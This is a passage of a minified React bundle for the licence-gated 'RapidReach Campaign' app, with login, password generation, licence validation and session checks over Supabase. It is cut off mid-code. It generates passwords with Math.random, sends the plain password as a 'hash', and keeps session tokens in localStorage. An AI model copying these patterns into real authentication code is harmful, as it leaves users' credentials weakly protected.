state:",{authToken:!!C,sessionAuth:T,passwordAuth:M}),C&&M?(console.log(" Found existing valid auth, redirecting to main app"),t()):console.log(" No valid auth found, staying on login")},[t]);const _=p.useCallback(async C=>{try{console.log(" Checking generation status for license:",C);const{data:T,error:M}=await $.rpc("check_generation_status",{license_key_input:C});return M?(console.error(" Generation status check error:",M),null):(console.log(" Generation status result:",T),j(T),T)}catch(T){return console.error(" Error checking generation status:",T),null}},[]),N=p.useCallback(async C=>{try{console.log(" Checking for existing cipher and cooldown"),await _(C);const{data:T,error:M}=await $.rpc("check_auth_cooldown",{license_key_input:C});if(M)return console.error(" Cooldown check error:",M),!1;if(console.log(" Cooldown check result:",T),T&&typeof T=="object"&&"under_cooldown"in T&&T.under_cooldown)return w(T),console.log(" Account under cooldown"),!1;try{const{data:A}=await $.from("license_keys").select("id").eq("license_key",C).single();if(A){const{data:R}=await $.from("auth_ciphers").select("id").eq("license_key_id",A.id).single();return g(!!R),!R}}catch{console.log("No existing cipher found")}return!0}catch(T){return console.error(" Error checking existing cipher:",T),!0}},[_]),S=p.useCallback(async()=>{if(!n.trim()){u("LICENSE KEY REQUIRED FOR CIPHER GENERATION");return}const C=3;let T=0;const M=async()=>{try{if(console.log(` Password generation attempt ${T+1}/${C}`),u(""),!await N(n)&&(v!=null&&v.under_cooldown)){const ne=Math.ceil(v.remaining_seconds/60);return u(`COOLDOWN ACTIVE - WAIT ${ne} MINUTES`),!1}if(m&&!confirm("Cipher already exists for this license. Reset password?"))return!1;console.log(" Generating secure password...");const R="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*";let I="";for(let ne=0;ne<24;ne++)I+=R.charAt(Math.floor(Math.random()*R.length));console.log(" Storing cipher in database...");const{data:J,error:K}=await $.rpc("create_auth_cipher_enhanced",{license_key_input:n,password_hash_input:I});if(K)throw console.error(" Database error:",K),K;if(!J||typeof J!="object"||!("success"in J)||!J.success){const ne=J&&typeof J=="object"&&"error"in J&&typeof J.error=="string"?J.error:"Failed to create cipher";throw console.error(" Cipher creation failed:",ne),new Error(ne)}return console.log(" Cipher stored successfully"),J.remaining_generations!==void 0&&j({...b,remaining_generations:J.remaining_generations,generations_used:J.generations_used,max_generations:J.max_generations}),r(I),await navigator.clipboard.writeText(I),o(!0),x(!0),sessionStorage.setItem("password_generated","true"),sessionStorage.setItem("generated_license_key",n),be.success("CIPHER GENERATED & COPIED TO CLIPBOARD!"),!0}catch(A){return console.error(` Generation attempt ${T+1} failed:`,A),T<C-1?(console.log(` Retrying in 2 seconds... (${T+2}/${C})`),u(`ATTEMPT ${T+1} FAILED - RETRYING...`),await new Promise(R=>setTimeout(R,2e3)),!1):(console.error(" All generation attempts failed"),u(A.message||"CIPHER GENERATION FAILED AFTER ALL RETRIES"),!1)}};try{for(c(!0);T<C&&!await M();)T++}finally{c(!1)}},[n,N,v,m,b]),k=p.useCallback(async C=>{if(C.preventDefault(),!e){u("CIPHER REQUIRED FOR ACCESS");return}try{c(!0),u(""),console.log(" Starting login process..."),console.log(" Authenticating with database function...");const{data:T,error:M}=await $.rpc("authenticate_user_session",{password_input:e});if(M){console.error(" Authentication error:",M),u("AUTHENTICATION FAILED - PLEASE TRY AGAIN");return}if(!T||typeof T!="object"||!("success"in T)||!T.success){const I=T&&typeof T=="object"&&"error"in T&&typeof T.error=="string"?T.error:"Authentication failed";console.error(" Authentication failed:",I),u("INCORRECT CIPHER - PASSWORD DOES NOT MATCH");return}console.log(" Authentication successful! Setting up session...");const A=T.session_token,R=T.license_key;localStorage.setItem("license_session_token",A),localStorage.setItem("licenseKey",R),localStorage.setItem("authTimestamp",Date.now().toString()),sessionStorage.setItem("redirect_system_authenticated","true"),sessionStorage.setItem("password_authenticated","true"),console.log(" Session data stored successfully"),be.success("ALIEN ACCESS AUTHORIZED - PHANTOM ENGINE ACTIVATED"),console.log(" Redirecting to main application..."),t(!1)}catch(T){console.error(" Login process failed:",T),u(`SYSTEM ERROR: ${T.message||"AUTHENTICATION FAILED"}`)}finally{c(!1)}},[e,t]);return a.jsxs("div",{className:"min-h-screen bg-gradient-to-br from-slate-900 via-blue-900 to-indigo-900 bg-[length:400%_400%] animate-gradient-flow flex items-center justify-center p-2 sm:p-3 md:p-4 relative overflow-hidden",children:[a.jsxs("div",{className:"absolute inset-0 pointer-events-none opacity-30 sm:opacity-100",children:[a.jsx("div",{className:"absolute top-20 left-10 w-16 h-16 bg-cyan-400/10 backdrop-blur-sm rounded-lg animate-float-1"}),a.jsx("div",{className:"absolute top-40 right-16 w-12 h-12 bg-blue-400/10 backdrop-blur-sm rounded-full animate-float-2"}),a.jsx("div",{className:"absolute bottom-32 left-1/4 w-20 h-8 bg-purple-400/10 backdrop-blur-sm transform rotate-45 animate-float-1"}),a.jsx("div",{className:"absolute bottom-20 right-1/3 w-10 h-10 bg-teal-400/10 backdrop-blur-sm transform rotate-12 animate-float-2"})]}),a.jsx("div",{className:"relative w-full max-w-xs sm:max-w-sm md:max-w-md z-10",children:a.jsxs("div",{className:"relative bg-gradient-to-br from-slate-800/80 via-blue-900/50 to-indigo-900/60 border border-cyan-400/30 backdrop-blur-sm rounded-2xl p-4 sm:p-6 md:p-8 shadow-2xl overflow-hidden",children:[a.jsx("div",{className:"absolute inset-0 bg-gradient-to-r from-cyan-400/5 via-blue-500/5 to-purple-500/5 animate-gradient-flow"}),a.jsx("div",{className:"absolute top-0 left-0 w-full h-px bg-gradient-to-r from-transparent via-cyan-400/50 to-transparent animate-scan-line"}),a.jsxs("div",{className:"text-center mb-6 sm:mb-8 relative z-10",children:[a.jsx("div",{className:"text-3xl sm:text-4xl md:text-5xl mb-3 sm:mb-4 text-white animate-bounce",children:""}),a.jsx("h2",{className:"text-xl sm:text-2xl md:text-3xl font-bold bg-gradient-to-r from-cyan-200 via-blue-200 to-purple-200 bg-clip-text text-transparent font-jetbrains uppercase tracking-wider mb-1 sm:mb-2 leading-tight",children:"RAPIDREACH CAMPAIGN"}),a.jsx("p",{className:"text-cyan-300/80 text-xs sm:text-sm font-jetbrains tracking-wide leading-relaxed px-2",children:"built for the culture"})]}),a.jsxs("form",{onSubmit:k,className:"space-y-4 sm:space-y-6",children:[a.jsxs("div",{className:"space-y-3 sm:space-y-4",children:[h&&a.jsxs(a.Fragment,{children:[a.jsx("div",{className:"relative group",children:a.jsx(Ze,{type:"text",placeholder:"Enter License Key",value:n,onChange:C=>s(C.target.value.toUpperCase()),className:"w-full px-3 sm:px-4 py-2 sm:py-3 bg-black/40 border border-purple-500/30 rounded-lg text-purple-100 placeholder-purple-300/50 focus:border-purple-400 focus:ring-2 focus:ring-purple-400/20 transition-all duration-300 backdrop-blur-sm font-mono text-sm sm:text-base min-h-[48px] touch-manipulation",disabled:l})}),b&&a.jsxs("div",{className:"text-center p-3 bg-purple-900/40 border border-purple-400/30 rounded-lg backdrop-blur-sm",children:[a.jsx("div",{className:"text-purple-300 text-xs font-jetbrains uppercase tracking-wider",children:" GENERATION STATUS"}),a.jsx("div",{className:"text-purple-200 text-sm font-mono mt-1",children:b.remaining_generations>0?a.jsxs(a.Fragment,{children:[a.jsx("span",{className:"text-green-300",children:b.remaining_generations})," / ",b.max_generations," generations remaining"]}):a.jsxs("span",{className:"text-red-300",children:["GENERATION LIMIT REACHED (",b.generations_used,"/",b.max_generations,")"]})})]})]}),a.jsxs("div",{className:"relative group",children:[a.jsx(Ze,{type:i?"text":"password",placeholder:h?"Generated Password Will Appear Here":"Paste Your Password",value:e,onChange:C=>r(C.target.value),className:"w-full px-3 sm:px-4 py-2 sm:py-3 bg-black/40 border border-cyan-500/30 rounded-lg text-cyan-100 placeholder-cyan-300/50 focus:border-cyan-400 focus:ring-2 focus:ring-cyan-400/20 transition-all duration-300 backdrop-blur-sm font-mono text-sm sm:text-base min-h-[48px] touch-manipulation",disabled:l||h,readOnly:h}),a.jsx("button",{type:"button",onClick:()=>o(!i),className:"absolute right-2 sm:right-3 top-1/2 transform -translate-y-1/2 text-cyan-300/70 hover:text-cyan-200 transition-colors p-1 min-h-[48px] min-w-[48px] flex items-center justify-center touch-manipulation",disabled:l,children:a.jsx("span",{className:"text-sm sm:text-base",children:i?"":""})})]}),d&&a.jsxs("div",{className:"flex items-center gap-2 text-red-400 text-sm font-mono text-center bg-red-500/10 border border-red-500/30 rounded-lg py-3 px-4 backdrop-blur-sm",children:[a.jsx(Pi,{className:"w-4 h-4 flex-shrink-0"}),a.jsx("span",{className:"break-words",children:d})]}),y&&h&&a.jsxs("div",{className:"mt-3 sm:mt-4 p-3 sm:p-4 bg-gradient-to-r from-green-900/40 to-emerald-900/40 border border-green-400/30 rounded-lg backdrop-blur-sm",children:[a.jsxs("div",{className:"text-green-300 text-xs sm:text-sm font-jetbrains uppercase tracking-wider text-center",children:[" ",a.jsx("strong",{children:"CIPHER GENERATED & COPIED!"}),a.jsx("br",{}),a.jsx("span",{className:"text-green-200/80 normal-case",children:"Next: Enter your license key to complete authorization"})]}),a.jsx(W,{type:"button",onClick:()=>t(!0),className:"w-full mt-3 bg-gradient-to-r from-cyan-600 to-blue-600 hover:from-cyan-500 hover:to-blue-500 text-white font-jetbrains font-bold uppercase tracking-wider text-xs sm:text-sm py-3 min-h-[48px] touch-manipulation",children:"Continue to License Validation"})]}),(v==null?void 0:v.under_cooldown)&&a.jsxs("div",{className:"text-yellow-400 text-sm font-mono text-center bg-yellow-500/10 border border-yellow-500/30 rounded-lg py-2 px-4 backdrop-blur-sm",children:["COOLDOWN ACTIVE - ",Math.ceil(v.remaining_seconds/60)," MINUTES REMAINING"]})]}),a.jsx("div",{className:"flex flex-col space-y-2 sm:space-y-3",children:h?a.jsxs(a.Fragment,{children:[!y&&a.jsx(W,{type:"button",onClick:S,disabled:l||!n.trim()||(b==null?void 0:b.remaining_generations)===0,className:"w-full bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-500 hover:to-pink-500 text-white font-bold py-3 px-4 sm:px-6 rounded-lg transition-all duration-300 transform hover:scale-[1.02] disabled:opacity-50 disabled:cursor-not-allowed disabled:transform-none font-mono uppercase tracking-wider text-sm sm:text-base min-h-[48px] touch-manipulation",children:l?"GENERATING...":"GENERATE PASSWORD"}),a.jsxs(W,{type:"button",onClick:()=>{f(!1),s(""),r(""),u(""),x(!1),g(!1),w(null)},disabled:l,className:"w-full bg-slate-700/80 hover:bg-slate-600/80 text-cyan-200 font-jetbrains font-bold py-3 px-6 rounded-lg transition-all duration-200 backdrop-blur-sm border border-cyan-400/40 hover:border-cyan-300/60 disabled:opacity-50 disabled:cursor-not-allowed uppercase tracking-wider text-xs sm:text-sm min-h-[48px] touch-manipulation flex items-center justify-center gap-2",children:[a.jsx(Kh,{size:16}),"BACK TO LOGIN"]})]}):a.jsxs(a.Fragment,{children:[a.jsx(W,{type:"submit",disabled:l||!e,className:"w-full bg-gradient-to-r from-cyan-600 to-blue-600 hover:from-cyan-500 hover:to-blue-500 text-white font-bold py-3 px-4 sm:px-6 rounded-lg transition-all duration-300 transform hover:scale-[1.02] disabled:opacity-50 disabled:cursor-not-allowed disabled:transform-none font-mono uppercase tracking-wider text-sm sm:text-base min-h-[48px] touch-manipulation",children:l?"VALIDATING...":"AUTHENTICATE"}),a.jsx("div",{className:"text-center py-1",children:a.jsx("span",{className:"text-cyan-300/60 text-xs sm:text-sm font-mono",children:"OR"})}),a.jsx(W,{type:"button",onClick:()=>{f(!0),r(""),u("")},disabled:l,className:"w-full bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-500 hover:to-pink-500 text-white font-bold py-3 px-4 sm:px-6 rounded-lg transition-all duration-300 transform hover:scale-[1.02] disabled:opacity-50 disabled:cursor-not-allowed disabled:transform-none font-mono uppercase tracking-wider text-sm sm:text-base min-h-[48px] touch-manipulation",children:"GENERATE NEW PASSWORD"})]})})]}),a.jsx("div",{className:"mt-6 pt-6 border-t border-cyan-400/30 relative z-10",children:a.jsxs("div",{className:"text-center",children:[a.jsx("p",{className:"text-xs text-cyan-300/70 font-mono mb-2",children:" PHANTOM PROTECTION"}),a.jsx("p",{className:"text-xs text-cyan-300/50 font-mono",children:"ENCRYPTED ACCESS  CULTURE VERIFIED"})]})})]})})]})};var b4="Label",Fv=p.forwardRef((t,e)=>a.jsx(ze.label,{...t,ref:e,onMouseDown:r=>{var s;r.target.closest("button, input, select, textarea")||((s=t.onMouseDown)==null||s.call(t,r),!r.defaultPrevented&&r.detail>1&&r.preventDefault())}}));Fv.displayName=b4;var Bv=Fv;const w4=Yi("text-sm font-medium leading-none peer-disabled:cursor-not-allowed peer-disabled:opacity-70"),Ht=p.forwardRef(({className:t,...e},r)=>a.jsx(Bv,{ref:r,className:we(w4(),t),...e}));Ht.displayName=Bv.displayName;const j4=({onValidationSuccess:t,onBack:e})=>{const[r,n]=p.useState(""),[s,i]=p.useState(!1),[o,l]=p.useState(""),[c,d]=p.useState(0),[u,h]=p.useState(!1),{toast:f}=Ln();p.useEffect(()=>{const g=sessionStorage.getItem("password_generated"),v=sessionStorage.getItem("generated_license_key");g&&v&&(h(!0),n(v))},[]);const m=async g=>{g.preventDefault();const v=sessionStorage.getItem("password_generated"),w=sessionStorage.getItem("generated_license_key"),y=v&&w?w:r.trim();if(!y){l("Please enter a license key");return}if(c>=5){l("Too many attempts. Please try again later.");return}l(""),i(!0);try{console.log(" Validating license key:",y);const{data:x,error:b}=await $.rpc("create_user_session_enhanced",{key_input:y});if(b)throw console.error(" Database error:",b),b;console.log(" Validation response:",x);const j=x;j&&j.valid?(console.log(" License validation successful"),localStorage.setItem("license_session_token",j.session_token),localStorage.setItem("license_session_expires",j.expires_at),sessionStorage.setItem("license_validated","true"),sessionStorage.removeItem("password_generated"),sessionStorage.removeItem("generated_license_key"),v&&sessionStorage.setItem("redirect_system_authenticated","true"),f({title:"ALIEN ACCESS AUTHORIZED",description:v?"CIPHER AND LICENSE VALIDATED. PHANTOM ENGINE ACTIVATED.":"PHANTOM ENGINE ACTIVATED. WELCOME TO RAPIDREACH."}),console.log(" Proceeding to main application"),t()):(console.error(" License validation failed:",j==null?void 0:j.error),l((j==null?void 0:j.error)||"Invalid license key"),d(_=>_+1))}catch(x){console.error(" License validation error:",x),l("System error. Please try again."),d(b=>b+1)}finally{i(!1)}};return a.jsxs("div",{className:"min-h-screen bg-gradient-to-br from-slate-900 via-blue-900 to-indigo-900 bg-[length:400%_400%] animate-gradient-flow flex items-center justify-center p-2 sm:p-3 md:p-4 relative overflow-hidden",children:[a.jsxs("div",{className:"absolute inset-0 pointer-events-none opacity-30 sm:opacity-100",children:[a.jsx("div",{className:"absolute top-20 left-10 w-16 h-16 bg-cyan-400/10 backdrop-blur-sm rounded-lg animate-float-1"}),a.jsx("div",{className:"absolute top-40 right-16 w-12 h-12 bg-blue-400/10 backdrop-blur-sm rounded-full animate-float-2"}),a.jsx("div",{className:"absolute bottom-32 left-1/4 w-20 h-8 bg-purple-400/10 backdrop-blur-sm transform rotate-45 animate-float-1"}),a.jsx("div",{className:"absolute bottom-20 right-1/3 w-10 h-10 bg-teal-400/10 backdrop-blur-sm transform rotate-12 animate-float-2"})]}),a.jsx("div",{className:"relative w-full max-w-xs sm:max-w-sm md:max-w-md z-10",children:a.jsxs("div",{className:"relative bg-gradient-to-br from-slate-800/80 via-blue-900/50 to-indigo-900/60 border border-cyan-400/30 backdrop-blur-sm rounded-2xl p-4 sm:p-6 md:p-8 shadow-2xl overflow-hidden",children:[a.jsx("div",{className:"absolute inset-0 bg-gradient-to-r from-cyan-400/5 via-blue-500/5 to-purple-500/5 animate-gradient-flow"}),a.jsx("div",{className:"absolute top-0 left-0 w-full h-px bg-gradient-to-r from-transparent via-cyan-400/50 to-transparent animate-scan-line"}),a.jsxs("div",{className:"text-center mb-6 sm:mb-8 relative z-10",children:[a.jsxs("div",{className:"mx-auto relative w-12 h-12 sm:w-14 sm:h-14 md:w-16 md:h-16 mb-3 sm:mb-4",children:[a.jsx("div",{className:"absolute inset-0 bg-gradient-to-r from-cyan-400/40 to-blue-500/40 rounded-xl animate-pulse blur-md"}),a.jsx("div",{className:"relative z-10 w-full h-full bg-gradient-to-br from-cyan-400/30 to-blue-500/30 rounded-xl border border-cyan-400/40 backdrop-blur-sm flex items-center justify-center",children:a.jsx(Ge,{className:"w-6 h-6 sm:w-7 sm:h-7 md:w-8 md:h-8 text-cyan-300"})})]}),a.jsx("h2",{className:"text-lg sm:text-xl md:text-2xl font-bold bg-gradient-to-r from-cyan-200 via-blue-200 to-purple-200 bg-clip-text text-transparent font-jetbrains uppercase tracking-wider mb-1 sm:mb-2 leading-tight px-2",children:u?"ALIEN AUTHORIZATION":"ALIEN ACCESS AUTHORIZATION"}),a.jsx("p",{className:"text-cyan-300/80 text-xs sm:text-sm font-jetbrains tracking-wide leading-relaxed px-2",children:u?"LICENSE CONFIRMATION REQUIRED":"INITIALIZE ACCESS PANEL TO ENTER PHANTOM ENGINE"})]}),a.jsxs("form",{onSubmit:m,className:"space-y-4 sm:space-y-6 relative z-10",children:[a.jsxs("div",{className:"space-y-1 sm:space-y-2",children:[a.jsx(Ht,{htmlFor:"licenseKey",className:"text-cyan-200 font-jetbrains font-bold uppercase tracking-wider text-xs sm:text-sm",children:"ACCESS PANEL"}),a.jsxs("div",{className:"relative",children:[a.jsx(Ze,{id:"licenseKey",type:"text",value:r,onChange:g=>n(g.target.value.toUpperCase()),placeholder:u?"CONFIRM YOUR LICENSE KEY":"PASTE YOUR ACCESS CODE",className:"bg-slate-700/80 border-cyan-400/30 text-cyan-200 font-jetbrains backdrop-blur-sm focus:border-cyan-300/60 placeholder:text-cyan-400/60 text-sm sm:text-base py-2 sm:py-3 px-3 sm:px-4 min-h-[48px] touch-manipulation",disabled:u}),o&&a.jsxs("div",{className:"absolute -bottom-6 sm:-bottom-7 left-0 flex items-center gap-1 text-red-300 text-xs font-jetbrains",children:[a.jsx(Pi,{className:"w-3 h-3 flex-shrink-0"}),a.jsx("span",{className:"break-words",children:o})]})]})]}),c>0&&c<5&&a.jsxs("div",{className:"text-xs sm:text-sm text-cyan-400/80 text-center font-jetbrains uppercase tracking-wider",children:["AUTHORIZATION ATTEMPTS: ",c,"/5"]}),a.jsxs("div",{className:"flex flex-col sm:flex-row gap-2 sm:gap-3 pt-2",children:[a.jsxs(W,{type:"button",variant:"outline",onClick:e,className:"order-2 sm:order-1 flex-1 bg-slate-700/80 border-cyan-400/40 text-cyan-200 hover:bg-slate-600/80 hover:border-cyan-300/60 font-jetbrains font-bold uppercase tracking-wider backdrop-blur-sm text-xs sm:text-sm py-3 min-h-[48px] touch-manipulation",children:[a.jsx(Kh,{className:"w-3 h-3 sm:w-4 sm:h-4 mr-1 sm:mr-2"}),"RETURN"]}),a.jsxs("div",{className:"order-1 sm:order-2 flex-1 relative group",children:[a.jsx("div",{className:"absolute -inset-1 bg-gradient-to-r from-cyan-500 via-blue-500 to-purple-500 rounded-lg opacity-60 blur group-hover:opacity-100 transition duration-300"}),a.jsx(W,{type:"submit",disabled:c>=5||s||!r.trim(),className:"relative z-10 w-full bg-gradient-to-r from-cyan-600 to-blue-600 hover:from-cyan-500 hover:to-blue-500 text-white font-jetbrains font-bold uppercase tracking-wider border-0 text-xs sm:text-base py-3 min-h-[48px] touch-manipulation",children:a.jsxs("div",{className:"flex items-center gap-1 sm:gap-2",children:[a.jsx(Ge,{className:"w-3 h-3 sm:w-4 sm:h-4"}),s?"VALIDATING...":u?"COMPLETE ACTIVATION":"AUTHORIZE ACCESS"]})})]})]})]}),a.jsx("div",{className:"mt-4 sm:mt-6 pt-4 sm:pt-6 border-t border-cyan-400/30 relative z-10",children:a.jsx("p",{className:"text-xs sm:text-sm text-cyan-300/70 text-center font-jetbrains leading-relaxed px-2",children:"DIMENSIONAL GATEWAY PROTOCOL ENGAGED"})})]})})]})},_4=()=>{console.log(" Cleaning up auth state..."),sessionStorage.removeItem("redirect_system_authenticated"),sessionStorage.removeItem("license_validated"),sessionStorage.removeItem("password_authenticated"),sessionStorage.removeItem("password_generated"),sessionStorage.removeItem("generated_license_key"),localStorage.removeItem("license_session_token"),localStorage.removeItem("license_session_expires"),localStorage.removeItem("licenseKey"),localStorage.removeItem("authTimestamp"),Object.keys(localStorage).forEach(t=>{(t.startsWith("supabase.auth.")||t.includes("sb-"))&&localStorage.removeItem(t)}),Object.keys(sessionStorage).forEach(t=>{(t.startsWith("supabase.auth.")||t.includes("sb-"))&&sessionStorage.removeItem(t)}),console.log(" Auth state cleanup complete")},Rs=t=>{console.log(" Force logout triggered:",t||"No reason specified"),_4(),t&&console.log(`Forced logout: ${t}`),window.location.replace("/greyboi")},N4=async t=>{try{console.log(" Validating session with database...");const{data:e,error:r}=await $.rpc("validate_session_with_license",{session_token_input:t});return r?(console.error(" Session validation error:",r),{valid:!1,error:r.message}):(console.log(" Session validation result:",e),e||{valid:!1,error:"No response"})}catch(e){return console.error(" Session validation exception:",e),{valid:!1,error:"Validation failed"}}},S4=({children:t})=>{const e=p.useRef(),r=p.useRef(null),n=p.useRef(null),s=p.useRef(null),[i,o]=p.useState("loading"),[l,c]=p.useState(!0),d=p.useCallback(b=>{e.current!==b&&(e.current=b,o(b))},[]),u=p.useCallback(()=>{n.current&&n.current.close(),n.current=new BroadcastChannel("auth-sync"),n.current.onmessage=b=>{b.data.type==="FORCE_LOGOUT"&&(console.log("Cross-tab logout triggered:",b.data.reason),Rs(b.data.reason))}},[]),h=p.useCallback(b=>{n.current&&n.current.postMessage({type:"FORCE_LOGOUT",reason:b})},[]),f=p.useCallback(async()=>{const b=localStorage.getItem("license_session_token");if(!b)return{valid:!1};try{const j=await N4(b);if(!j.valid)return console.log("Session validation failed:",j.error),h(`Session validation failed: ${j.error}`),Rs(`Session validation failed: ${j.error}`),{valid:!1};const _=j.license_id;return _&&(s.current=_),{valid:j.valid,licenseKeyId:_}}catch(j){return console.error("Database validation error:",j),h("Database validation failed"),Rs("Database validation failed"),{valid:!1}}},[h]),m=p.useCallback(async()=>{console.log(" Checking auth state...");const b=sessionStorage.getItem("password_authenticated"),j=localStorage.getItem("license_session_token"),_=sessionStorage.getItem("redirect_system_authenticated");if(console.log(" Auth tokens:",{passwordAuth:!!b,licenseSessionToken:!!j,redirectAuth:!!_}),b&&j){console.log(" User has password auth + license session, validating...");const N=await f();if(N.valid){console.log(" Full authentication confirmed"),d("authenticated"),N.licenseKeyId&&x(N.licenseKeyId);return}}if(b&&!j){console.log(" Password auth exists but no valid session, need license key"),d("needsLicenseKey");return}if(_&&!b){if(console.log(" Legacy license-only user detected"),j){const N=await f();if(N.valid){d("authenticated"),N.licenseKeyId&&x(N.licenseKeyId);return}}d("needsLicenseKey");return}console.log(" No valid authentication found, need login"),d("needsLogin")},[d,f]),g=p.useCallback(async()=>{if(e.current!=="authenticated")return;if(!localStorage.getItem("license_session_token")){await m();return}await m()},[m]),v=p.useCallback((b=!1)=>{console.log(" Login success, isPasswordGeneration:",b);const j=sessionStorage.getItem("password_authenticated"),_=localStorage.getItem("license_session_token");b?(console.log(" Password generation flow - need license validation"),d("needsLicenseKey")):j&&_?(console.log(" Existing user with full auth - authenticated"),d("authenticated")):(console.log(" Need license validation"),d("needsLicenseKey"))},[d]),w=p.useCallback(()=>{console.log(" License validated successfully"),d("authenticated")},[d]),y=p.useCallback(()=>{console.log(" Back to login"),d("needsLogin")},[d]),x=p.useCallback(b=>{r.current&&($.removeChannel(r.current),r.current=null),r.current=$.channel(`license-monitor-${b}`).on("postgres_changes",{event:"DELETE",schema:"public",table:"license_keys",filter:`id=eq.${b}`},async j=>{console.log("User license deleted in real-time:",j),h("Your license was deleted"),Rs("Your license was deleted")}).on("postgres_changes",{event:"UPDATE",schema:"public",table:"license_keys",filter:`id=eq.${b}`},async j=>{console.log("User license updated in real-time:",j);const _=j.new;(_==null?void 0:_.status)==="paused"?(h("Your license was paused"),Rs("Your license was paused")):_&&(!_.is_active||_.status!=="active")&&(h("Your license was deactivated"),Rs("Your license was deactivated"))}).subscribe((j,_)=>{_?(console.error("Real-time subscription error:",_),setTimeout(()=>{s.current&&x(s.current)},5e3)):console.log("Real-time subscription status:",j)})},[h]);return p.useEffect(()=>{u(),(async()=>{console.log(" Initializing auth..."),c(!0),await m(),c(!1),console.log(" Auth initialization complete")})();const j=setInterval(g,60*1e3);return()=>{clearInterval(j),r.current&&$.removeChannel(r.current),n.current&&n.current.close()}},[m,g,u]),l||i==="loading"?a.jsx("div",{className:"min-h-screen flex items-center justify-center bg-gradient-to-br from-slate-900 via-blue-900 to-indigo-900",children:a.jsx("div",{className:"animate-spin rounded-full h-8 w-8 border-b-2 border-primary"})}):i==="needsLogin"?a.jsx(v4,{onLoginSuccess:v}):i==="needsLicenseKey"?a.jsx(j4,{onValidationSuccess:w,onBack:y}):a.jsx(a.Fragment,{children:t})},k4=({expiresAt:t,expiryPreset:e,className:r=""})=>{const[n,s]=p.useState({days:0,hours:0,minutes:0,seconds:0,total:0}),[i,o]=p.useState(!1);if(p.useEffect(()=>{o(!0)},[]),p.useEffect(()=>{if(!t||e==="lifetime"){s({days:0,hours:0,minutes:0,seconds:0,total:0});return}const h=()=>{const m=new Date().getTime(),v=new Date(t).getTime()-m;if(v>0){const w=Math.floor(v/864e5),y=Math.floor(v%(1e3*60*60*24)/(1e3*60*60)),x=Math.floor(v%(1e3*60*60)/(1e3*60)),b=Math.floor(v%(1e3*60)/1e3);s({days:w,hours:y,minutes:x,seconds:b,total:v})}else s({days:0,hours:0,minutes:0,seconds:0,total:0})};h();const f=setInterval(h,1e3);return()=>clearInterval(f)},[t,e]),!i)return a.jsxs("div",{className:`flex items-center gap-2 ${r}`,children:[a.jsx(cr,{className:"w-4 h-4 text-blue-400"}),a.jsx("span",{className:"text-blue-300 font-mono",children:"Loading..."})]});if(e==="lifetime"||!t)return a.jsxs("div",{className:`flex items-center gap-2 ${r}`,children:[a.jsxs("div",{className:"relative",children:[a.jsx(Gj,{className:"w-5 h-5 text-emerald-400 animate-pulse"}),a.jsx("div",{className:"absolute inset-0 bg-emerald-400/30 rounded-full blur-sm animate-pulse"})]}),a.jsx("span",{className:"text-emerald-300 font-mono font-semibold",children:"Lifetime"})]});if(n.total<=0)return a.jsxs("div",{className:`flex items-center gap-2 ${r}`,children:[a.jsx(cr,{className:"w-4 h-4 text-red-400"}),a.jsx("span",{className:"text-red-300 font-mono font-semibold",children:"Expired"})]});const l=()=>{const h=n.total/36e5;return h>24?"text-emerald-300":h>1?"text-yellow-300":"text-red-300"},c=()=>{const h=n.total/36e5;return h>24?"text-emerald-400":h>1?"text-yellow-400":"text-red-400"},d=n.total<24*60*60*1e3,u=()=>n.days>0?`${n.days}d ${n.hours}h ${n.minutes}m`:n.hours>0?`${n.hours}h ${n.minutes}m ${n.seconds}s`:`${n.minutes}m ${n.seconds}s`;return a.jsxs("div",{className:`flex items-center gap-2 ${r}`,children:[a.jsx(cr,{className:`w-4 h-4 ${c()} ${d?"animate-pulse":""}`}),a.jsx("span",{className:`font-mono font-semibold ${l()} ${d?"animate-pulse":""}`,children:u()})]})},E4=()=>{const[t,e]=p.useState(null),[r,n]=p.useState(!0),[s,i]=p.useState(!0),{toast:o}=Ln(),l=async()=>{try{const g=localStorage.getItem("license_session_token");if(!g){console.log("No session token found"),e(null),n(!1);return}console.log("Fetching license data with token:",g.slice(0,8)+"...");const{data:v,error:w}=await $.from("user_sessions").select(`
          *,
          license_keys:license_key_id (
            license_key,
            expires_at,
            expiry_preset,
            password_generation_count,
            max_password_generations,
            status,
            assigned_user_email
          )
        `).eq("session_token",g).eq("is_active",!0).maybeSingle();if(console.log("Session query result:",{sessionData:v,sessionError:w}),w){console.error("License session error:",w),e(null),n(!1);return}if(!v){console.log("No session data found"),e(null),n(!1);return}if(!v.license_keys){console.log("No license keys found in session data"),e(null),n(!1);return}const y=v.license_keys;console.log("License data found:",y),e(y)}catch(g){console.error("Error fetching license data:",g),e(null)}finally{n(!1)}};if(p.useEffect(()=>{l();const g=$.channel("license-status-changes").on("postgres_changes",{event:"*",schema:"public",table:"license_keys"},v=>{var w;console.log("License status changed:",v),l(),v.eventType==="UPDATE"&&v.new.status!==((w=v.old)==null?void 0:w.status)&&o({title:"License Status Updated",description:`License status changed to: ${v.new.status}`,variant:v.new.status==="paused"?"destructive":"default"})}).subscribe();return()=>{$.removeChannel(g)}},[o]),r)return a.jsxs(q,{className:"mb-6 relative bg-gradient-to-br from-slate-800/80 via-blue-900/50 to-indigo-900/60 border border-cyan-400/30 backdrop-blur-sm overflow-hidden",children:[a.jsx("div",{className:"absolute top-0 left-0 w-full h-px bg-gradient-to-r from-transparent via-cyan-400/50 to-transparent"}),a.jsx(X,{className:"relative z-10 p-6",children:a.jsxs("div",{className:"animate-pulse",children:[a.jsxs("div",{className:"flex items-center gap-3 mb-4",children:[a.jsx("div",{className:"w-6 h-6 bg-cyan-400/30 rounded animate-pulse"}),a.jsx("div",{className:"h-5 bg-cyan-400/20 rounded w-1/3"})]}),a.jsx("div",{className:"h-4 bg-blue-400/20 rounded w-1/2"})]})})]});if(!t)return null;const c=()=>{switch(t.status){case"active":return a.jsx(Se,{className:"bg-gradient-to-r from-emerald-500/30 to-green-400/30 text-emerald-200 border border-emerald-400/40 font-jetbrains font-bold uppercase tracking-wider",children:"OPERATIONAL"});case"paused":return a.jsx(Se,{className:"bg-gradient-to-r from-yellow-500/30 to-orange-400/30 text-yellow-200 border border-yellow-400/40 font-jetbrains font-bold uppercase tracking-wider",children:"SUSPENDED"});case"expired":return a.jsx(Se,{className:"bg-gradient-to-r from-red-500/30 to-pink-400/30 text-red-200 border border-red-400/40 font-jetbrains font-bold uppercase 